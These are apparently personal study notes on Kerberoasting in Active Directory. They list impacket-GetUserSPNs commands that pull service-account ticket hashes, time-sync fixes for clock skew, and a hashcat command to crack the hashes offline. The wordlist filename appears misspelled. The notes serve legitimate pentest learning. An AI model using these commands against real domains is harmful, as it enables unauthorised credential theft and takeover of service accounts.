If you have a user account authenticated to AD, you can run
- impacket-GetUserSPNs <DOMAIN>/<user>:'<pass>' -dc-ip <IP> -request
    
    - if you get a clock skew too great error you can run this
    
![image 201.png](/image%20201.png)
- sudo ntpdate <IP>
    
    - syncs with domain’s time
    
if that doesn’t work, run
- timedatectl set-ntp off
- sudo rdate -n <IP>
    
    ![image 1 166.png](../assets/Kerberoasting/image%201%20166.png)
    
- returns the hash for any user that has an SPN (service principal name)
  
Decrypting SPN hash
- hashcat -m 13100 hash.txt /usr/share/wordlists/rockydcou.txt
  
  
Getting SPNs with an authenticed user with kerberos authentication
- impacket-GetUserSPNs -request -dc-ip <IP> -k -no-pass <DOMAIN>/<user> -dc-host <NetBIOS>